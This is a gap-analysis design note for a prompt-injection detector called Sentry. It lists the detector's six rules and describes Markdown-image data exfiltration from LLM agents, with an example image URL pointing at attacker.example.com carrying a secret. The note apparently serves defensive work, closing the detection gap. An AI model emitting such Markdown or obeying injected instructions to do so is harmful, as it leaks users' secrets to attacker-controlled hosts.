# Gap analysis — Sentry, Phase 2 target

Written before touching the agent. Sentry's six rules
(`verifiers/sentry/rules/default_rules.json`) and its test conventions
(`verifiers/sentry/tests/test_rules_detection.py`) were read in full, not
skimmed.

## The six existing rules

| Rule | Catches |
|---|---|
| `agent_directed_address` | Direct addressing of the AI ("hey Claude", "dear AI") |
| `hidden_channel_instruction` | Imperative instructions inside HTML/code comments |
| `scope_expansion_phrase` | "also create", "in addition to the above", etc. |
| `confirmation_bypass_claim` | "no confirmation needed", "just run it" |
| `env_exfil_pattern` | `os.environ` access/serialization in code |
| `network_exfil_pattern` | `urllib`/`requests.post`/`requests.put` calls carrying serialized env data |

## The gap

`env_exfil_pattern` and `network_exfil_pattern` both assume exfiltration
happens through **Python code** the agent writes — `os.environ`,
`requests.post(...)`. Neither rule, nor any of the other four, examines
**Markdown link/image syntax** at all.

This matters because many LLM-agent front ends and chat UIs auto-render
Markdown, including auto-fetching image URLs (`![alt](https://...)`) the
moment the message is displayed — no code execution, no explicit
`requests.post` call, nothing that looks like "exfiltration code." An
attacker-controlled or injected instruction can smuggle data out by simply
getting the agent to *emit* a Markdown image (or link) whose URL embeds the
data as a query parameter pointing at an attacker-controlled host:

```
![status](https://attacker.example.com/log?d=<secret-here>)
```

The rendering client fetching that image is itself the exfiltration — the
agent never has to write or run exfiltration code, which is exactly what
`env_exfil_pattern`/`network_exfil_pattern` are looking for and exactly
why they miss this. This is a real, previously documented class of attack
against LLM agents/chat UIs, not a hypothetical.

None of Sentry's six current rules would fire on the example above: it
contains no `os.environ`, no `requests.*` call, no HTML comment, no direct
address to the AI, no scope-expansion phrasing, and no confirmation-bypass
claim. It is invisible to the current ruleset.

## Task description used for the Worker Agent

> Sentry's six default rules include `env_exfil_pattern` and
> `network_exfil_pattern` for exfiltration via Python code (`os.environ`
> access, `requests.post` to a suspicious host), but none of the six rules
> match a well-documented alternate exfiltration channel: exfiltration via
> auto-rendered Markdown image syntax. Many LLM-agent front-ends and chat
> UIs auto-fetch image URLs found in Markdown output (e.g.
> `![...](https://...)`), so an attacker-controlled or injected
> instruction can smuggle sensitive data out by asking the agent to emit a
> Markdown image (or plain link) whose URL embeds the data as a query
> parameter pointing at an attacker-controlled host — the mere act of
> rendering the message triggers an outbound HTTP request, with no code
> execution or explicit exfil pattern like `os.environ`/`requests.post`
> involved at all. This is a real, previously disclosed technique against
> LLM agents/chat UIs, and is structurally invisible to Sentry's current
> ruleset because none of its six rules examine Markdown link/image syntax
> at all. Add one new detection rule to Sentry that closes this specific
> gap, plus its test cases, following Sentry's existing conventions
> exactly.

The exact rule name, regex pattern, severity, and test strings are left
for the Worker Agent to draft — the gap and the constraint (follow
Sentry's existing conventions) are fixed in advance; the implementation is
not.
